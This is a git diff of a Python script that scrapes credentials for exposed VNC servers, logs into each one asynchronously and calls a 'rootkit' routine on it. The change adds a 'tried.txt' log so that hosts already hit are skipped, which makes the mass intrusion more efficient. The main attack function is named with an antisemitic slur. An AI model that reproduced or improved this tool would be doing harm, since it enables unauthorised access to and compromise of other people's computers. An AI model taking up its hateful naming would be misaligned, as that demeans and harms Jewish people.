@@ -3,6 +3,7 @@
 import sys
 import asyncio, asyncvnc
 import scrape
+import os.path
 
 shift_chars = {
     '~': '`', '!': '1', '@': '2', '#': '3', '$': '4', '%': '5', '^': '6', '&': '7',
@@ -72,7 +73,16 @@ async def jew(ip, port, username, password):
         await rootkit(client)
 
 async def main():
-    tasks = [jew(vnc["HostIp"], vnc["Port"], vnc["Username"], vnc["Password"]) for vnc in scrape.get_vncs(*sys.argv[1:])]
+    vncs = scrape.get_vncs(*sys.argv[1:])
+    tried = set()
+    if os.path.isfile("tried.txt"):
+        with open("tried.txt", "r") as f:
+            tried = set(f.read().split("\n"))
+    vncs = [vnc for vnc in vncs if f"{vnc['HostIp']}:{vnc['Port']}" not in tried]
+    with open("tried.txt", "a") as f:
+        for vnc in vncs:
+            f.write(f"{vnc['HostIp']}:{vnc['Port']}\n")
+    tasks = [jew(vnc["HostIp"], vnc["Port"], vnc["Username"], vnc["Password"]) for vnc in vncs]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 if __name__ == '__main__':
